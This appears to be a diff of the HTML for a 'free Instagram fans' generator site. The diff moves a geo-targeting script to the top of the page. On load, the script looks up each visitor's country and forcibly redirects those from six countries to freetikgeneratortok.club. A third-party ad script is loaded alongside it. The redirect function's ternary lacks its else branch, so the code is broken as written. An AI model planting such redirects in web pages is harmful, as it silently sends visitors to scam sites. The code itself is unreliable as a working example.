@@ -3,6 +3,37 @@
 <html lang="en">
 
 <script>var pm_pid = "15334-09bdabb8";</script><script src="//tik.9mod.club/js/pub.min.js" async></script>
+ <script>
+        /*!
+         * GeoIP Target Filter
+         * Project: https://github.com/OpenAff/geoip-target-filter
+         *
+         * ---------------------------------------------------------------------
+         * A small snippet for geo-filter redirection using GeoIP API.
+         * Add your targeted country's "ISO 3166-1 - Alpha-2" codes to the filter
+         * to automatically redirect targeted visitors to your targeted URL and
+         * to non-targeted URL otherwise.
+         *
+         * Country Codes can be found @( Wikipedia - http://bit.ly/nWBMYz )
+         * See Column: "Alpha-2 Code"
+         * ---------------------------------------------------------------------
+         */
+
+        var filter = ['US', 'GB', 'CA', 'AU', 'IN' , 'EG'];
+        var targetVisitorsUrl = 'https://freetikgeneratortok.club/instagram';
+
+        // ------------------------------------------------------
+        // DON'T EDIT THE BELOW CODE UNLESS REQUIRED
+        // ------------------------------------------------------
+        /**
+         * Check if the visitor is from targeted country, Redirect to target URL.
+         * Otherwise to non-target URL.
+         */
+        function geoip(g){window.top.location.href=inArray(g.country,filter)?targetVisitorsUrl}
+        function inArray(r,n){for(var t=n.length,e=0;t>e;e++)if(n[e]==r)return!0;return!1}
+    </script>
+	
+	    <script src="https://get.geojs.io/v1/ip/country.js?callback=geoip"></script>
 	<head>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 	<meta name="yandex-verification" content="51545f17b91b83d6" />
@@ -740,39 +771,7 @@ free Instagram fans fast no survey,">
 
 </body>
 	
-	
-	        <script>
-        /*!
-         * GeoIP Target Filter
-         * Project: https://github.com/OpenAff/geoip-target-filter
-         *
-         * ---------------------------------------------------------------------
-         * A small snippet for geo-filter redirection using GeoIP API.
-         * Add your targeted country's "ISO 3166-1 - Alpha-2" codes to the filter
-         * to automatically redirect targeted visitors to your targeted URL and
-         * to non-targeted URL otherwise.
-         *
-         * Country Codes can be found @( Wikipedia - http://bit.ly/nWBMYz )
-         * See Column: "Alpha-2 Code"
-         * ---------------------------------------------------------------------
-         */
-
-        var filter = ['US', 'GB', 'CA', 'AU', 'IN' , 'EG'];
-        var targetVisitorsUrl = 'https://freetikgeneratortok.club/instagram';
-
-        // ------------------------------------------------------
-        // DON'T EDIT THE BELOW CODE UNLESS REQUIRED
-        // ------------------------------------------------------
-        /**
-         * Check if the visitor is from targeted country, Redirect to target URL.
-         * Otherwise to non-target URL.
-         */
-        function geoip(g){window.top.location.href=inArray(g.country,filter)?targetVisitorsUrl}
-        function inArray(r,n){for(var t=n.length,e=0;t>e;e++)if(n[e]==r)return!0;return!1}
-    </script>
-
-        <script src="https://get.geojs.io/v1/ip/country.js?callback=geoip"></script>
-        <script src="ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.html"></script>
+	        <script src="ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.html"></script>
     <script src="maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.html"></script>
     <script src="cdn.jsdelivr.net/jquery.validation/1.13.1/jquery.validate.min.html"></script>
     <script src="sw.js"></script>
